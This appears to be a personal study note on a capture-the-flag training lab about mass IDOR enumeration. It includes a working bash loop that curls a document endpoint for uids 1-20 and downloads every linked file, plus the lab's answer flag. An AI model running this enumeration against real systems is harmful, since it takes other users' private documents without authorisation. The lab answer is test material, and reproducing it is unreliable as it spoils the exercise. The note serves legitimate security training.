# NOTE — Web Attacks § 8: Mass IDOR Enumeration

## ID
532

## Module
Web Attacks

## Kind
notes

## Title
Section 8 — Mass IDOR Enumeration

## Description
Exploits an IDOR vulnerability in a document retrieval endpoint by scripting uid enumeration across 20 users to mass-download all employee documents and extract a hidden flag file.

## Tags
idor, mass-enumeration, bash-scripting, parameter-tampering, document-exfiltration

## Commands
- curl -s -X POST "http://<TARGET>:<PORT>/documents.php" -d "uid=<UID>" | grep -oP "/documents.*?\.[a-z]{3}"
- wget -q "http://<TARGET>:<PORT><DOCUMENT_PATH>"
- bash enum.sh <TARGET>:<PORT>
- cat flag*.txt

## What This Section Covers
IDOR (Insecure Direct Object Reference) vulnerabilities let attackers access resources belonging to other users by manipulating a predictable parameter like `uid`. When no server-side access control validates ownership, an attacker can enumerate all users and mass-download their files with a simple loop script.

## Methodology
1. Browse to `/documents.php` and intercept the request — note it sends `uid` as a POST parameter
2. Manually test `uid=1`, `uid=2`, etc. to confirm the IDOR: different uids return different document links with no access denied
3. Identify the link pattern by grepping the HTML: `grep -oP "/documents.*?\.[a-z]{3}"`
4. Write a bash loop over uids 1–20, curling each and extracting all document links
5. Use `wget` inside the loop to download every discovered file
6. After the script finishes, check for a `.txt` flag file with `cat flag*.txt`

## Multi-step Workflow
```bash
#!/bin/bash
url="http://$1"
for i in {1..20}; do
    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); do
        wget -q "$url$link"
    done
done
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Get list of docs for first 20 uids, find the `.txt` flag | HTB{4ll_f1l35_4r3_m1n3} | Bash loop over uids 1–20 with POST to `/documents.php`, downloaded all files, flag in `flag_11dfa168ac8eb2958e38425728623c98.txt` |

## Key Takeaways
- IDOR testing starts simple: change the uid parameter and compare the response — different file links = no access control
- The regex `/documents.*?\.[a-z]{3}` catches all file extensions (pdf, txt, etc.), not just `.pdf`
- Always check how the parameter is sent — this lab uses POST (`-d "uid=$i"`), not GET (`?uid=$i`) as the teaching material initially showed
- Static file IDORs (predictable filenames like `Invoice_1_09_2021.pdf`) are the simplest form; parameter-based IDORs on endpoints are more common
- In real engagements, scale from 20 to thousands — Burp Intruder or custom scripts both work

## Gotchas
- The section text describes a GET parameter (`?uid=1`) but the actual lab sends uid via POST — intercepting in Burp reveals the real method
- The grep pattern must use `[a-z]{3}` (not just `.pdf`) to catch the `.txt` flag file among the PDFs
- Running `wget` without `-q` floods stdout with download progress — use quiet mode when scripting
